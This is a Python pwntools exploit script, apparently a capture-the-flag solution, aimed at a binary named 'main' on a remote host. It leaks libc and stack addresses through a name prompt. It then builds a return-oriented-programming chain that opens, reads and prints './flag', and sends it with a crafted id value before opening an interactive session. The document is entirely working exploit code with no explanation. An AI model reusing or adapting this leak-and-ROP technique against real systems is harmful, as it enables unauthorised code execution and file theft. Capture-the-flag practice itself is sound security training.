from pwn import*
context.log_level = 'DEBUG'
p = process('./main')
p = remote('183.129.189.60',10041)
libc =ELF('./libc-2.23.so')
p.sendline('1')
p.sendline('1')
p.sendline('1')
p.sendline('2')
p.sendafter('name:','F'*8)
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - 0x7B61E
log.info('LIBC:\t' + hex(libc_base))
p.sendafter('name:','F'*8*5)
stack = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - 0xD0
log.info('Stack:\t' + hex(stack))

Open = libc_base + libc.symbols["open"]
Read = libc_base + libc.symbols["read"]
Puts = libc_base + libc.symbols['puts']
pop_rdi_ret = libc_base + 0x0000000000021112
pop_rsi_ret = libc_base + 0x00000000000202F8
pop_rdx_ret = libc_base + 0x0000000000001B92
pop_rdx_xx = libc_base + 0x00000000000EA759
orw  = ''
orw += p64(pop_rdi_ret)+p64(stack + 0x78)
orw += p64(pop_rsi_ret)+p64(0)
orw += p64(Open)
orw += p64(pop_rdi_ret) + p64(3)
orw += p64(pop_rsi_ret) + p64(libc.bss() + libc_base + 0x200)
orw += p64(Read)
orw += p64(pop_rdi_ret)+p64(libc.bss() + libc_base + 0x200)
orw += p64(Puts)
orw += './flag\x00\x00'

payload = p64(0x30) + '\x00'*0x4 + p32(0x602028) + orw
p.sendlineafter('name:',payload)
p.sendlineafter('id',str((pop_rdx_xx&0xFFFFFFFF)))
p.interactive()
